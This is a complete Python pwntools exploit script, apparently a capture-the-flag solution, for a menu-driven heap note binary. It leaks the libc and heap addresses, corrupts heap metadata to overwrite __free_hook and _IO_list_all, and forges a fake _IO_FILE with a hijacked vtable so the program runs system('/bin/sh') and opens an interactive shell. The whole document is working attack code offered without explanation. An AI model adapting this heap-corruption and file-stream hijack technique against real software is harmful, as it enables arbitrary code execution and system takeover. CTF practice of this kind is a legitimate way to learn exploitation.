#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	lg("p.pid")
	input()
	pass

def menu(cmd):
	sla(b'Choice: ', i2b(cmd))
def add(size, content, newLine=True):
	menu(1)
	sla(b'size: ', i2b(size))
	content = content+b'\n' if (newLine) else content
	sa(b'message: ', content)
def show(idx):
	menu(2)
	sla(b'index: ', i2b(idx))
def edit(idx, content):
	menu(3)
	sla(b'index: ', i2b(idx))
	sa(b'message: ', content)
def free(idx):
	menu(4)
	sla(b'index: ', i2b(idx))
def change(user):
	menu(5)
	if user == 1:
		sla(b'user:\n', b'A\x01\x95\xc9\x1c')
	elif user == 2:
		sla(b'user:\n', b'B\x01\x87\xc3\x19')
	elif user == 3:
		sla(b'user:\n', b'C\x01\xf7\x3c\x32')

change(2)
for i in range(5):
	add(0x90, b'a'*0x30)
	free(i)
change(1)
add(0x130, b'a'*0x60)
for i in range(7):
	add(0x130, b'a'*0x60)
	free(i+1)
free(0)
change(2)
add(0x90, b'a'*0x30)

change(1)
add(0x150, b'a'*0x70)
for i in range(7):
	add(0x150, b'a'*0x70)
	free(i+9)
free(8)
change(2)
add(0xb0, b'a'*0x40)

change(1)
add(0x430, b'a'*0x160)
change(2)
add(0xf0, b'a'*0x40)
change(1)
free(16)
change(2)
change(1)
show(16)
ru(b'The message is: ')
libc_base = uu64(ru(b'\n', "drop")) - 0x1ecbe0
free_hook_addr = libc_base + l.symbols['__free_hook']
lg("libc_base")
change(2)
show(1)
ru(b'The message is: ')
heap_base = uu64(ru(b'\n', "drop")) - 0x11eb0
lg("heap_base")

add(0x440, b'a'*0x160)
change(1)
add(0x430, b'a'*0x160)
add(0x430, b'a'*0x160)
add(0x430, b'a'*0x160)
change(2)
free(8)
add(0x450, b'a'*0x160)
change(1)
free(17)
change(2)
edit(8, p64(0) + p64(free_hook_addr - 0x28) + b'\n')
change(3)

add(0xa0, b'a'*0x30)

change(2)
edit(8, p64(heap_base + 0x13c00)*2+b'\n')

change(3)
add(0x380,b'a'*0x120)
IO_list_all = libc_base + l.symbols['_IO_list_all']
change(1)
free(19)
change(2)

edit(8,p64(0)+p64(IO_list_all-0x20)+b'\n')

change(3)
add(0xa0, b'a'*0x30)
change(2)
edit(8, p64(heap_base + 0x13c00)*2+b'\n')

change(1)
edit(8, b'a'*0x40 + p64(heap_base + 0x12260) + p64(free_hook_addr-0x20) +b'\n')

change(3)
payload = b'\x00'*0x18 + p64(heap_base + 0x14540)
payload = payload.ljust(0x158, b'\x00')
add(0x440, payload)
add(0x90, b'a'*0x30, False)

str_jumps=libc_base+0x1e9560
fake_IO_FILE = 2*p64(0)
fake_IO_FILE += p64(1) #_IO_write_base = 1
fake_IO_FILE += p64(0xffffffffffff) #_IO_write_ptr = 0xffffffffffff
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(heap_base+0x14620)                #_IO_buf_base
fake_IO_FILE += p64(heap_base+0x14638)                #_IO_buf_end
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
fake_IO_FILE += p64(0)                    #change _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(str_jumps)        #change vtable
payload = fake_IO_FILE + b'/bin/sh\x00' + 2*p64(libc_base + l.symbols['system'])
sa('Gift:', payload)


debugPID()
irt()
